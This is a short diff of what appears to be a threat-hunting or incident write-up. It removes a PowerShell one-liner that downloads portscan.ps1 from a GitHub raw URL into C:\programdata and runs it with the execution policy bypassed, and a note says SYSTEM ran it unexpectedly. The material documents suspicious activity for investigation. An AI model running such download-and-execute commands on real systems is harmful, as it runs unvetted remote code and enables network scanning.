@@ -117,10 +117,6 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacif
 
 ```
 
-powershell
-Copy
-Edit
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/.../portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
 Account:
 Executed by SYSTEM — not expected behavior; not triggered by any admin.
 
